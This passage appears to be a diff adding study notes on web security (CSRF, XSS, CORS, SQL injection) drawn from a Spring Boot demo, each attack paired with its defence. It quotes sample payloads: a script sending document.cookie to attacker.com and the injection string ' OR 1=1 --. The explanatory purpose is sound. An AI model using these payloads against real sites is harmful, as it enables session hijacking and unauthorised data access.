+- **Server Validation:** The server validates this token. If a request comes without the correct token (as an attacker using a simple HTML page would not know it), the server knows the request is not from a legitimate source and rejects it.
+
+---
+
+### **2. XSS (Cross-Site Scripting)**
+
+**What it is:**
+
+- XSS allows an attacker to **put a malicious script into a web page viewed by other users**.
+- It is commonly used for **stealing session cookies** or **deforming (defacing) a website**.
+
+**How it happens (Mechanism and Demo Explanation):**
+
+1.  **Vulnerable Web Page:** The attack typically occurs on web pages where users can input content (like comments or posts) that is then displayed to other users without proper sanitisation.
+2.  **Attacker Injects Script:** Instead of a regular comment, an attacker posts a **malicious script** (e.g., `<script>alert('xss attack')</script>` or a script to send `document.cookie` to an attacker's site).
+3.  **Script Stored:** This malicious script is stored on the server (e.g., in a database or in-memory list).
+4.  **Other User Views Page:** When another legitimate user accesses the web page (triggering a `GET` call for comments).
+5.  **Browser Executes Script:** As the malicious comment (containing the script) is loaded, the **user's browser executes the script automatically**.
+
+**Example Demo Walkthrough:**
+
+- A Spring Boot application with a `GET /xss` endpoint to load comments and a `POST /comment` endpoint to add comments.
+- The `POST /comment` endpoint directly adds the user's input string to a list of comments **without validation or escaping**.
+- **Attacker Action:** An attacker enters `<script>alert('xss attack')</script>` into the comment field and submits it. This comment gets stored.
+- **Victim Action:** Any other user visiting the `/xss` page will trigger the `GET /xss` call. When the page renders, the browser will execute the stored script, causing an "xss attack" popup.
+
+**Harmful Impact (Beyond Pop-ups):**
+
+- While a simple popup may seem harmless, XSS can be used to **steal user cookies**.
+- **Cookie Stealing:** An attacker can replace the simple alert with a script like `<script>window.location='http://attacker.com/steal?cookie='+document.cookie</script>`.
+- This script, when executed by the victim's browser, will send the victim's `document.cookie` (which contains their session ID) to the attacker's server.
+- **Security Compromise:** Once the attacker has the user's session ID, they can access authenticated parts of the website freely, leading to data loss or security compromise.
+
+**How to Protect:**
+
+- **Proper Escaping of User Input:** When accepting user input, **special characters must be properly escaped**.
+- For example, `<` should be changed to `&lt;` and `>` to `&gt;`.
+- This ensures that the browser treats the input as plain text (a string) and **does not execute it as a script**.
+- **Proper Validation:** Implement **proper validation** to define what values are allowed and not allowed in user input fields.
+
+---
+
+### **3. CORS (Cross-Origin Resource Sharing)**
+
+**What it is:**
+
+- CORS is **not an attack**, but rather a **security feature** that can be enabled or disabled.
+- It restricts web pages from making requests to a different origin **unless explicitly allowed by the server**.
+- It can be considered a **first line of defense** or a "first security gate".
+
+**What "Different Origin" Means:**
+
+- An origin is defined by the **protocol, domain, and port**.
+- If any of these three components differ between the client (where the request originates) and the server (where the request is sent), it's considered a different origin.
+- **Examples of Different Origins:**
+  - Client `https://localhost:8080` to Server `http://localhost:8080` (Different Protocol: `https` vs `http`).
+  - Client `http://localhost:8080` to Server `http://localhost:9090` (Different Port: `8080` vs `9090`).
+  - Client `http://sub.local` to Server `http://local` (Different Domain/Subdomain: `sub.local` vs `local`).
+
+**How it Works (Server-Side Configuration):**
+
+- The server must explicitly **whitelist** the origins from which it will accept requests.
+- This is typically done by setting the `Access-Control-Allow-Origin` header in the server's response.
+- **Example Configuration (Spring Security):**
+  - Using a `CorsConfiguration` to define an `allowedOriginList` (e.g., `https://sub.localhost:9090`).
+  - Specifying `allowedMethods` (e.g., `GET`, `POST`, `PUT`, `DELETE`) and `allowedHeaders`.
+- If a request comes from an origin not in the server's allowed list, the server will **not entertain it**, blocking the request at an early stage.
+
+**Importance:**
+
+- CORS acts as an initial security layer, preventing requests from potentially malicious external sources (different origins) from even reaching the application logic, complementing other protections like CSRF tokens.
+
+---
+
+### **4. SQL Injection**
+
+**What it is:**
+
+- SQL Injection is an attack where an **attacker manipulates an SQL query by inserting malicious input into user fields**.
+- It can lead to **unauthorised data access**, **database deletion**, or **revealing database structure** (table names, column names).
+
+**How it happens (Mechanism and Demo Explanation):**
+
+1.  **Vulnerable Query:** The vulnerability arises when user input is **directly concatenated into an SQL query** without proper validation or sanitisation.
+2.  **Attacker Input:** An attacker inserts malicious SQL code into a user input field (e.g., a search field).
+3.  **Query Manipulation:** The server then constructs and executes an SQL query using this malicious input, effectively altering the original query's intent.
+4.  **Malicious Execution:** The manipulated query can then perform unauthorised actions or retrieve sensitive data.
+
+**Example Demo Walkthrough:**
+
+- A vulnerable API `/find` takes a `name` parameter and directly uses it in a query like `SELECT * FROM user_details WHERE user_name = '` + `name` + `'`.
+- **Initial State:** The database has two users (e.g., `aaa` and `bbb`).
+- **Attacker Input:** Instead of a username, the attacker provides `something' OR 1=1 -- `. (Note: The source shows `/find` followed by `slash or 1 = 1` which is then internally replaced to `'' OR 1=1`).
+- **Manipulated Query:** The query becomes `SELECT * FROM user_details WHERE user_name = '' OR 1 = 1`.
+- **Result:**
+  - `user_name = ''` is false (assuming no empty username).
+  - `OR 1 = 1` is always true.
+  - Because of `OR 1=1`, the **condition is always true**, causing the query to return **all records** from the `user_details` table, regardless of authentication or original intent.
+- **Other Attacks:** Attackers can also use SQL Injection to fetch database names, table names, or even `DROP TABLE` commands to delete tables.
+
+**How to Protect:**
+
+- The primary protection method is by using **parameterized queries**.
+- **Mechanism:** Instead of directly inserting user input into the query string, use placeholders (parameters).
+- The database driver then handles these parameters separately, ensuring that the input is treated as a **value (string data)** and not as executable SQL code.
+- **Example:** Instead of `SELECT * FROM user_details WHERE user_name = '` + `name` + `'`, use `SELECT * FROM user_details WHERE user_name = ?` and then **set the parameter** `name`.
+- **Benefit:** With parameterized queries, even if an attacker provides `something' OR 1=1 -- `, it will be treated as a literal string value for the `user_name` field, which will likely match no records, thus preventing the injection.
